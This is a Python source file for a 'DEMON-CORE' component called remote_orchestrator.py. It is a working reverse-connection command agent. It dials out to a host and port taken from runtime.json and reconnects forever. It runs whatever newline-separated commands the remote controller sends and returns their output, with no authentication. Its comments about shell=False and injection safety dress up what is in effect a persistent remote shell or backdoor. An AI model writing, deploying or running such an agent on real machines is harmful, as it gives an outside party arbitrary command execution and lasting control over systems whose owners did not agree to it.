#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
remote_orchestrator.py
Persistent outbound TCP command orchestrator for DEMON-CORE.
Reads endpoint configuration from runtime.json.
Couples to db_manager and messenger modules for session logging and alerts.

Security notes:
- Commands are executed with shell=False (argument list via shlex.split).
  This prevents classic shell injection via metacharacters.
- All side-effects (db_manager / messenger) are isolated behind try/except
  and run AFTER the response is sent, so a lock or exception in those
  modules can never collapse the reverse connection.
"""

import json
import logging
import select
import shlex
import socket
import subprocess
import sys
import time
from typing import Optional, Tuple

# Modular coupling – soft imports with graceful degradation
try:
    import db_manager
except ImportError:
    db_manager = None

try:
    import messenger
except ImportError:
    messenger = None

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - [REMOTE_ORCH] %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

# Constants
CONFIG_PATH = "runtime.json"
RECONNECT_DELAY = 5
BUFFER_SIZE = 4096
COMMAND_TIMEOUT = 15
CONNECT_TIMEOUT = 10


def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
    """
    Parse orchestration host and port from local JSON configuration.
    Falls back to 127.0.0.1:8080 if keys are absent.
    """
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = json.load(fh)
        host = cfg.get("host", "127.0.0.1")
        port = int(cfg.get("port", 8080))
        if not host or port <= 0 or port > 65535:
            raise ValueError("invalid host or port value")
        return host, port
    except (OSError, KeyError, ValueError, TypeError, json.JSONDecodeError) as exc:
        logger.warning("config load issue (%s) – using defaults 127.0.0.1:8080", exc)
        return "127.0.0.1", 8080


def execute_command(command_str: str) -> Tuple[str, str]:
    """
    Execute local command via subprocess.run with an explicit argument list.
    shell=False is mandatory – prevents shell metacharacter injection.
    Returns (output_text, status) where status is 'success' or 'error'.
    """
    try:
        # shlex.split produces a safe argv list; never pass the raw string with shell=True
        args = shlex.split(command_str)
        if not args:
            return "[WARN] empty command", "error"

        result = subprocess.run(
            args,
            shell=False,                    # explicit: no shell interpretation
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=COMMAND_TIMEOUT,
            check=False,
        )

        output = result.stdout or ""
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr

        if not output:
            output = "[INFO] no output"

        status = "success" if result.returncode == 0 else "error"
        return output, status

    except subprocess.TimeoutExpired:
        return f"[ERROR] command timed out after {COMMAND_TIMEOUT}s", "error"
    except FileNotFoundError:
        return "[ERROR] command not found", "error"
    except Exception as exc:
        return f"[ERROR] execution failed: {exc}", "error"


def send_all(sock: socket.socket, data: bytes) -> bool:
    """
    Transmit entire buffer via sock.sendall.
    Returns True on success, False on transport failure.
    """
    try:
        sock.sendall(data)
        return True
    except (BrokenPipeError, ConnectionResetError, OSError) as exc:
        logger.error("send failure: %s", exc)
        return False


def _safe_log_session(command_str: str, output: str, status: str) -> None:
    """
    Isolated side-effect: never raises into the transport loop.
    Any Database Lock / ImportError / AttributeError is swallowed.
    """
    if db_manager is None:
        return
    try:
        if hasattr(db_manager, "log_session_event"):
            db_manager.log_session_event(command_str, output, status)
    except Exception as exc:
        # Explicitly catch everything – including database locks – so the
        # reverse TCP session stays alive.
        logger.error("db_manager.log_session_event failed (isolated): %s", exc)


def _safe_dispatch_alert(message_text: str) -> None:
    """
    Isolated side-effect: never raises into the transport loop.
    """
    if messenger is None:
        return
    try:
        if hasattr(messenger, "dispatch_alert"):
            messenger.dispatch_alert(message_text)
    except Exception as exc:
        logger.error("messenger.dispatch_alert failed (isolated): %s", exc)


def process_stream(sock: socket.socket) -> None:
    """
    Non-blocking command ingestion loop.
    Frames messages on newline boundaries, executes, replies first,
    then performs isolated logging / alerting.
    """
    buffer = b""
    while True:
        readable, _, _ = select.select([sock], [], [], 1.0)
        if not readable:
            continue

        try:
            data = sock.recv(BUFFER_SIZE)
            if not data:
                logger.warning("peer closed connection")
                break

            buffer += data

            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                command_str = line.decode("utf-8", errors="replace").strip()
                if not command_str:
                    continue

                logger.info("executing: %s", command_str)
                output, status = execute_command(command_str)

                # 1. Reply to controller FIRST – transport is never blocked by side-effects
                response = (output + "\n").encode("utf-8")
                if not send_all(sock, response):
                    return

                # 2. Side-effects AFTER the response is on the wire.
                #    Isolated so a lock or exception cannot drop the session.
                _safe_log_session(command_str, output, status)
                _safe_dispatch_alert(
                    f"command completed status={status} cmd={command_str[:120]}"
                )

        except BlockingIOError:
            continue
        except ConnectionResetError:
            logger.warning("connection reset by peer")
            break
        except Exception as exc:
            logger.error("receive/processing error: %s", exc)
            break


def main() -> None:
    """
    Infinite reconnection loop around the transport pipeline.
    """
    host, port = load_config()

    while True:
        sock: Optional[socket.socket] = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECT_TIMEOUT)
            sock.connect((host, port))
            sock.setblocking(False)
            logger.info("connected to orchestrator %s:%d", host, port)

            # Alert is isolated – failure must not prevent the session from starting
            _safe_dispatch_alert(f"session established {host}:{port}")

            process_stream(sock)

        except Exception as exc:
            logger.error("connection failure: %s", exc)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
            logger.info("reconnecting in %d seconds", RECONNECT_DELAY)
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()
